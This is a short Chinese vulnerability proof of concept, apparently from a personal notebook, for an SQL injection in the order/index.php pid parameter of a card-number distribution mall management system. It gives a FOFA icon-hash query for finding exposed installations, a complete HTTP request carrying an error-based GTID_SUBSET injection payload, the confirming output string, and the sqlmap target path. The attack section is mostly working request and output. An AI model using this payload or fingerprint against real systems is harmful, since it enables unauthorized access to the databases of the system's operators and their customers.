# 卡号极团管理系统order存在SQL注入漏洞

# 一、漏洞简介
号卡极团分销商城管理系统,同步对接多平台,同步订单信息,支持敢探号一键上架,卡号极团管理系统order存在SQL注入漏洞，攻击者获取数据库权限。

# 二、影响版本
+ 卡号极团管理系统

# 三、资产测绘
+ fofa`icon_hash="-795291075"`
+ 特征

![1711762130074-1574a63a-86db-476c-88d8-f1d859f412c0.png](./img/7J6w5NhjMVIoid6V/1711762130074-1574a63a-86db-476c-88d8-f1d859f412c0-525058.png)

# 四、漏洞复现
```plain
GET /order/index.php?pid=1%27+AND+GTID_SUBSET%28CONCAT%280x716a6a7171%2C%28SELECT+%28ELT%287046%3D7046%2C1%29%29%29%2C0x7162786b71%29%2C7046%29--+NqPh HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1711762221617-14382173-fac1-45b1-ac64-300c146f1395.png](./img/7J6w5NhjMVIoid6V/1711762221617-14382173-fac1-45b1-ac64-300c146f1395-376665.png)

```plain
qjjqq1qbxkq
```

sqlmap

```plain
/order/index.php?pid=1
```

![1711762244256-31d1262f-b6a1-4266-996a-eda7e00394c0.png](./img/7J6w5NhjMVIoid6V/1711762244256-31d1262f-b6a1-4266-996a-eda7e00394c0-456337.png)



> 更新: 2024-04-20 22:27:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yyyq138u9iev4ton>